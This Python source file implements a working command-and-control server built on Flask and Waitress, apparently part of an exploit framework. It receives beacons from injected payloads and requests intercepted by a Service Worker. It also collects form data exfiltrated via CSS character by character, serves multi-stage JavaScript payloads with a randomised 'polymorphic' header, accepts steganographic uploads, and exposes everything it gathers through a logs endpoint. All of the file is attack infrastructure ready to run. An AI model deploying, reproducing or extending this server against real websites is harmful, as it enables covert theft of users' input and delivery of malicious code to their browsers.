"""
c2.py - Command & Control Server

A production-grade Flask-based C2 server using Waitress and rate-limiting.
"""

from flask import Flask, request, jsonify
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional
import json
import hashlib
import os
import logging
from waitress import serve


def create_app(
    auth_key: Optional[str] = None,
    log_file: Optional[Path] = None,
    payload_dir: Optional[Path] = None,
) -> Flask:
    """
    Create and configure the Flask C2 application.
    """
    app = Flask(__name__)
    
    # Configuration - Priority: Arguments > Environment > Defaults
    auth_key = auth_key or os.getenv('C2_AUTH_KEY')
    
    # Support Lab Mode or explicit log file via env
    env_log_file = os.getenv('C2_LOG_FILE') or os.getenv('EXXPLOIT_SESSION_FILE')
    if not log_file and env_log_file:
        log_file = Path(env_log_file)
        
    app.config['AUTH_KEY'] = auth_key
    app.config['LOG_FILE'] = log_file or Path('c2_logs.json')
    app.config['PAYLOAD_DIR'] = payload_dir or Path(__file__).parent.parent.parent
    
    # Rate Limiting
    limiter = Limiter(
        get_remote_address,
        app=app,
        default_limits=["1000 per day", "100 per hour"],
        storage_uri="memory://",
    )
    
    # --- Middleware ---
    
    @app.before_request
    def check_auth():
        """Check API key if configured."""
        if app.config['AUTH_KEY']:
            key = request.headers.get('X-API-Key') or request.args.get('key')
            if key != app.config['AUTH_KEY']:
                return jsonify({'error': 'Unauthorized'}), 401
    
    # --- Logging ---
    
    def log_event(event_type: str, data: dict):
        """Log an event to the log file."""
        entry = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'type': event_type,
            'ip': request.remote_addr,
            'data': data
        }
        try:
            with open(app.config['LOG_FILE'], 'a') as f:
                f.write(json.dumps(entry) + '\n')
        except Exception as e:
            app.logger.error(f'Log error: {e}')
    
    # --- Routes ---
    
    @app.route('/health', methods=['GET'])
    def health():
        """Health check endpoint."""
        return jsonify({
            'status': 'alive',
            'time': datetime.now(timezone.utc).isoformat(),
            'version': '1.1.0'
        }), 200
    
    @app.route('/beacon', methods=['POST', 'GET'])
    @limiter.limit("10 per minute")
    def beacon():
        """Receives data from payloads."""
        try:
            if request.method == 'POST':
                data = request.get_json() or {}
            else:
                data = dict(request.args)
            
            log_event('beacon', data)
            return jsonify({'status': 'ok'}), 200
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    
    @app.route('/intercept', methods=['POST'])
    def intercept():
        """Receives intercepted requests from Service Worker."""
        try:
            data = request.get_json() or {}
            log_event('intercept', data)
            return jsonify({'status': 'logged'}), 200
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    
    @app.route('/stage/<int:stage>/<payload>', methods=['GET'])
    def serve_payload(stage: int, payload: str):
        """Serves multi-stage payloads dynamically."""
        # Sanitize payload name
        safe_payload = ''.join(c for c in payload if c.isalnum() or c in '._-')
        if not safe_payload.endswith('.js'):
            safe_payload += '.js'
        
        payload_path = app.config['PAYLOAD_DIR'] / safe_payload
        
        if payload_path.exists():
            code = payload_path.read_text()
            
            # Polymorphic wrapper
            request_id = hashlib.md5(str(datetime.now(timezone.utc)).encode()).hexdigest()[:8]
            wrapped = f'/* {request_id} */\n{code}'
            
            log_event('stage_serve', {'stage': stage, 'payload': safe_payload})
            return wrapped, 200, {'Content-Type': 'application/javascript'}
        else:
            return 'console.log("Payload not found");', 404, {'Content-Type': 'application/javascript'}
    
    @app.route('/upload', methods=['POST'])
    @limiter.limit("5 per minute")
    def upload():
        """Receives steganographic images or file uploads."""
        try:
            upload_dir = app.config['PAYLOAD_DIR'] / 'uploads'
            upload_dir.mkdir(exist_ok=True)
            
            if 'avatar' in request.files:
                file = request.files['avatar']
                save_path = upload_dir / f'{datetime.utcnow().timestamp()}.png'
                file.save(save_path)
                log_event('stego_upload', {'path': str(save_path)})
            
            return jsonify({'status': 'uploaded'}), 200
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    
    @app.route('/css/<field>/<int:index>/<int:charcode>', methods=['GET'])
    def css_exfil(field: str, index: int, charcode: int):
        """Receives CSS exfiltration data."""
        char = chr(charcode) if 0 < charcode < 65536 else '?'
        log_event('css_exfil', {'field': field, 'index': index, 'char': char})
        # Return 1x1 transparent GIF
        return (
            b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00'
            b'\x00\x00\x00\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00'
            b'\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x01'
            b'\x44\x00\x3b'
        ), 200, {'Content-Type': 'image/gif'}
    
    @app.route('/logs', methods=['GET'])
    def view_logs():
        """View collected logs."""
        try:
            logs = []
            log_path = app.config['LOG_FILE']
            if log_path.exists():
                logs = [json.loads(line) for line in log_path.read_text().splitlines() if line.strip()]
            return jsonify(logs), 200
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    
    @app.route('/logs/clear', methods=['POST'])
    def clear_logs():
        """Clear all logs."""
        try:
            app.config['LOG_FILE'].write_text('')
            return jsonify({'status': 'cleared'}), 200
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    
    return app


def run_server(host: Optional[str] = None, port: Optional[int] = None, **kwargs):
    """Run the C2 server using Waitress."""
    host = host or os.getenv('C2_HOST', '0.0.0.0')
    port = port or int(os.getenv('C2_PORT', 8080))
    
    app = create_app(**kwargs)
    print(f'[C2] Starting production server on {host}:{port}')
    serve(app, host=host, port=port, _quiet=True)


if __name__ == '__main__':
    run_server()
